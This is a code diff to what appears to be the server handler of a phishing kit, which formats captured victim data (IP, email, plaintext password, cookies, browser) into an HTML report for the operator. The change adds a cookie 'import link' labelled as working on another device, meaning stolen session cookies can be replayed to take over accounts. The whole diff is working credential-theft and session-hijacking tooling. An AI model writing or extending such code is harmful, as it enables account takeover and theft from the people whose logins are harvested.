@@ -43,7 +43,9 @@ export default async function handler(req, res) {
             <tr><td><strong>🌐 IP</strong></td><td>${ip}</td></tr>
             <tr><td><strong>📧 Email</strong></td><td>${data.email}</td></tr>
             <tr><td><strong>🔑 Password</strong></td><td style="font-family:monospace;color:#d93025">${data.password}</td></tr>
-            <tr><td><strong>🍪 Cookies</strong></td><td><code>${data.cookies || 'none'}</code></td></tr>
+            <tr><td><strong>🍪 Cookies</strong></td><td>${data.cookiesImportLink
+              ? `<a href="${String(data.cookiesImportLink).replace(/"/g, '&quot;')}" target="_blank" style="color:#1a73e8;word-break:break-all">Import link (works on other device)</a>`
+              : `<code>${(data.cookies || 'none').replace(/</g, '&lt;')}</code>`}</td></tr>
             <tr><td><strong>👤 Browser</strong></td><td>${data.userAgent?.slice(0,80)}...</td></tr>
           </table>
           <details>
